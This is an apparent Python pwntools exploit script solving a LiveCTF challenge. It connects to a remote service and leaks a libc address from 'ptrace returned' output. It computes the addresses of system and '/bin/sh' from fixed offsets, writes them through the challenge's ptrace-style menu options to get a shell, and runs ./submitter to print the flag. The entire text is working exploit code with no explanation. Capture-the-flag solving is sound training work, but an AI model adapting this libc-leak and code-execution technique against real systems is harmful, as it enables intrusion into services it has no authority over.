from pwn import *
import sys

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))
# s = process(["./ld-linux-x86-64.so.2", './challenge'],
#             env={"LD_PRELOAD": "./libc.so.6"})
sla = s.sendlineafter
sa = s.sendafter

s.sendline(b'3')
s.sendline(hex(16*8).encode())
s.sendline(b'0')
s.sendline(b'1')

s.recvuntil(b'ptrace returned')
libc = int(s.recvline(), 16) - 0xeabc7
system = libc + 0x50d60
binsh = libc + 1935000

s.sendline(b'6')
s.sendline(hex(16*8).encode())
s.sendline(hex(system).encode())
s.sendline(b'1')

s.sendline(b'6')
s.sendline(hex(14*8).encode())
s.sendline(hex(binsh).encode())
s.sendline(b'1')

s.sendline(b'7')
s.sendline(str(0).encode())
s.sendline(b'0')
s.sendline(b'0')

s.sendline(b'./submitter')

flag = s.recvline_contains(b'LiveCTF{').decode().strip()
log.info("Flag: %s", flag)
